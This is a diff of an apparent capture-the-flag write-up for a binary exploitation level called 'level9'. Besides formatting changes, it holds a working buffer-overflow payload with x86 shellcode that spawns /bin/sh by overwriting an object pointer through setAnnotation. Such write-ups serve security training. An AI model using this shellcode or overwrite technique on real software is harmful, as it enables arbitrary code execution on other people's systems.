@@ -23,12 +23,14 @@
                         [...]
 ```
 
-## goal:
+## Goal:
 
-By examining the assembly code we find out that a call is made to a pointer address pointed by the value stored at the begining of v4.
-Using v6->setAnnotation we overwrite the pointer at the beginning of v4 with the address of v6 buffer. There we put the address of 4 char farther
-where we put our shellcode.
+- By examining the assembly code we find out that a call is made to a pointer address pointed by the value stored at the begining of `v4`.
+- Using `v6->setAnnotation` we overwrite the pointer at the beginning of `v4` with the address of `v6` buffer.
+- There we put the address of 4 char farther, where we put our shellcode.
 
-## the hack:
+## The Hack:
 
+```console
 ./level9 $(perl -e 'print "\x10\xa0\x04\x08" . "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" . "A" x 80 . "\x0c\xa0\x04\x08"') ; cat
+```
